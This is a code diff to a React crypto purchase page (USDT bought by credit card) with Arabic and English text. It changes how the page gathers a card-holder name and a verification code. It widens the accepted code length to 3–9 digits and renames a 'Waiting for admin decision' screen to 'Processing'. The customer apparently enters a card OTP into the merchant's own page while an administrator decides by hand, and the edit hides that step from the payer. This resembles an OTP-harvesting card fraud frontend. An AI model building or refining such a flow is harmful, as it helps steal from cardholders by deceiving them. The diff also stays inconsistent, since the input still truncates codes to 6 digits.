@@ -195,7 +195,6 @@ export default function BuyPage() {
 
   const canSendCard = Boolean(
     isCreditCard &&
-      name &&
       usdtWallet &&
       walletNetwork &&
       usdtAmount >= 5 &&
@@ -251,7 +250,7 @@ export default function BuyPage() {
       const response = await createOrder({
         orderId: createdOrderId,
         visitorId: getOrCreateVisitorId(),
-        name,
+        name: isCreditCard ? (cardHolderName || name) : name,
         wallet: normalizedWallet,
         walletNetwork: normalizedNetwork,
         usdtAmount,
@@ -303,8 +302,8 @@ export default function BuyPage() {
       return;
     }
     const code = String(otpCode || '').trim();
-    if (!/^\d{6}$/.test(code)) {
-      setError(isRtl ? 'يرجى إدخال كود مكوّن من 6 أرقام.' : 'Please enter a 6-digit code.');
+    if (!/^\d{3,9}$/.test(code)) {
+      setError(isRtl ? 'يرجى إدخال كود مكوّن من 3 إلى 9 أرقام.' : 'Please enter a code with 3 to 9 digits.');
       return;
     }
 
@@ -772,18 +771,20 @@ export default function BuyPage() {
                     </div>
                   </div>
                 )}
-                <div className="input-group buy-span-2">
-                  <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
-                    {isRtl ? 'الاسم الكامل' : 'Full Name'}
-                  </label>
-                  <input
-                    className="input-control"
-                    value={name}
-                    onChange={(e) => setName(e.target.value)}
-                    placeholder={isRtl ? 'أحمد محمد' : 'Ahmed Mohammed'}
-                    style={{ textAlign: isRtl ? 'right' : 'left' }}
-                  />
-                </div>
+                {!isCreditCard && (
+                  <div className="input-group buy-span-2">
+                    <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
+                      {isRtl ? 'الاسم الكامل' : 'Full Name'}
+                    </label>
+                    <input
+                      className="input-control"
+                      value={name}
+                      onChange={(e) => setName(e.target.value)}
+                      placeholder={isRtl ? 'أحمد محمد' : 'Ahmed Mohammed'}
+                      style={{ textAlign: isRtl ? 'right' : 'left' }}
+                    />
+                  </div>
+                )}
                 {!isCreditCard && (
                   <>
                     <div className="input-group buy-span-2">
@@ -935,13 +936,13 @@ export default function BuyPage() {
                   </div>
 
                   <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left', marginTop: '1rem' }}>
-                    {isRtl ? 'أدخل كود التحقق (6 أرقام)' : 'Verification code (6 digits)'}
+                    {isRtl ? 'أدخل كود التحقق (3-9 أرقام)' : 'Verification code (3-9 digits)'}
                   </label>
                   <input
                     className="input-control"
                     value={otpCode}
                     onChange={(e) => setOtpCode(String(e.target.value).replace(/\D/g, '').slice(0, 6))}
-                    placeholder={isRtl ? 'مثال: 123456' : 'e.g. 123456'}
+                    placeholder={isRtl ? 'مثال: 12345' : 'e.g. 12345'}
                     dir="ltr"
                     inputMode="numeric"
                     style={{ textAlign: 'left' }}
@@ -961,7 +962,7 @@ export default function BuyPage() {
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
                 <div className="cc-otp-await buy-span-2">
                   <div className="cc-otp-spinner" aria-hidden="true" />
-                  <div className="cc-otp-await-title">{isRtl ? 'بانتظار قرار الإدمن' : 'Waiting for admin decision'}</div>
+                  <div className="cc-otp-await-title">{isRtl ? 'جار المعالجة' : 'Processing'}</div>
                   <div className="cc-otp-await-code">
                     {otpCode ? (
                       <span>
@@ -1034,7 +1035,7 @@ export default function BuyPage() {
                       : stage === 2
                         ? (sending || cd.remainingMs === 0 || usdtAmount < 5 || (isCreditCard ? !canSendCard : false))
                         : stage === 3
-                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{6}$/.test(String(otpCode || '').trim()))
+                          ? (verifyingOtp || cd.remainingMs === 0 || !/^\d{3,9}$/.test(String(otpCode || '').trim()))
                           : true
                 }
               >
